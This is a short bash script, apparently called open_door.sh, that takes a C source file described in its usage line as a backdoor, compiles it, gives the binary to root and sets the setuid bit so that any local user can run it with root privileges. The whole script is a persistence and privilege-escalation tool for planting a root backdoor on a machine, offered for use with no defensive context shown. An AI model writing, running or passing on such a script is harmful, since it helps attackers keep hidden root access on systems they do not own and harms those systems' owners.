#!/bin/bash

HELP="Uso: sudo ./open_door.sh <BACKDOOR_FILE.c> <OUTPUT_FILE>"

CFILE=$(file "$1" | grep "C source")

if [ -z "$SUDO_USER" ] || [ $# -lt 2  ] || [ -z "$CFILE" ]; then
  echo "$HELP"
  exit 1
else
  gcc "$1" -o "$2"
  chown root:root "$2"
  chmod 4755 "$2"
fi

